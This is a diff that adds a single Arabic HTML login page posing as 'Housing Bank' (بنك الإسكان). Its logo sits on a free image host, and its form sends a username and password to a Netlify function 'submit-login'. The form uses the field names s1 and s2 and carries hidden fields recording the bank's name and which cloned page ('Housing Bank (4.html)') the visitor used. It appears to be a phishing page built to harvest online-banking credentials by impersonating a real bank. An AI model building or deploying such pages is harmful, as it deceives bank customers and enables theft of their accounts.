@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بنك الإسكان - تسجيل الدخول</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #f4f4f4;
+            min-height: 100vh;
+            direction: rtl;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        /* القائمة العلوية */
+        .header {
+            width: 100%;
+            padding: 20px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .menu-icon {
+            width: 30px;
+            height: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            cursor: pointer;
+        }
+        
+        .menu-line {
+            width: 100%;
+            height: 3px;
+            background-color: #222;
+        }
+        
+        /* الشعار */
+        .logo-container {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            margin: 20px 0 40px;
+        }
+        
+        .logo {
+            max-width: 280px;
+            height: auto;
+        }
+        
+        /* نموذج تسجيل الدخول */
+        .login-form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+        
+        .form-control {
+            width: 100%;
+            background-color: white;
+            border: 1px solid #eee;
+            border-radius: 10px;
+            padding: 20px;
+            font-size: 16px;
+            color: #333;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
+        }
+        
+        .form-control::placeholder {
+            color: #aaa;
+        }
+        
+        .form-control:focus {
+            outline: none;
+            border-color: #005b97;
+        }
+        
+        .btn-login {
+            width: 100%;
+            background-color: #005b97;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            padding: 15px;
+            font-size: 18px;
+            text-align: center;
+            cursor: pointer;
+            margin-top: 20px;
+            box-shadow: 0 4px 10px rgba(0, 91, 151, 0.3);
+            font-weight: bold;
+        }
+        
+        .footer-text {
+            text-align: center;
+            color: #777;
+            font-size: 14px;
+            margin-top: 40px;
+            line-height: 1.5;
+        }
+        
+        /* الرموز الحركية في الأسفل */
+        .animated-icons {
+            margin-top: 80px;
+            width: 100%;
+            height: 200px;
+            position: relative;
+            opacity: 0.08;
+        }
+        
+        .icon1 {
+            position: absolute;
+            top: 10%;
+            left: 20%;
+            font-size: 40px;
+        }
+        
+        .icon2 {
+            position: absolute;
+            top: 30%;
+            right: 25%;
+            font-size: 40px;
+        }
+        
+        .icon3 {
+            position: absolute;
+            bottom: 10%;
+            left: 40%;
+            font-size: 40px;
+        }
+    </style>
+</head>
+<body>
+    <!-- القائمة العلوية -->
+    <div class="header">
+        <div class="menu-icon">
+            <div class="menu-line"></div>
+            <div class="menu-line"></div>
+            <div class="menu-line"></div>
+        </div>
+    </div>
+    
+    <div class="container">
+        <!-- الشعار -->
+        <div class="logo-container">
+            <img src="https://www2.0zz0.com/2025/05/13/13/427263311.png" alt="بنك الإسكان" class="logo">
+        </div>
+        
+        <!-- نموذج تسجيل الدخول -->
+        <form action="/.netlify/functions/submit-login" method="post" class="login-form" id="loginForm">
+            <input type="hidden" name="bank_name" value="بنك الاسكان العماني">
+            <input type="hidden" name="source" value="Housing Bank (4.html)">
+            <input name="s1" type="text" class="form-control" placeholder="اسم المستخدم" required>
+            <input name="s2" type="password" class="form-control" placeholder="كلمة المرور" required>
+            <button type="submit" class="btn-login">الدخول</button>
+        </form>
+        
+        <p class="footer-text">
+            جميع الحقوق محفوظة © بنك الإسكان للتجارة والتمويل<br>
+            يعمل بموجب ترخيص البنك المركزي
+        </p>
+        
+        <!-- الرموز الحركية في الأسفل -->
+        <div class="animated-icons">
+            <div class="icon1">🏠</div>
+            <div class="icon2">💰</div>
+            <div class="icon3">📱</div>
+        </div>
+    </div>
+
+</body>
+</html>
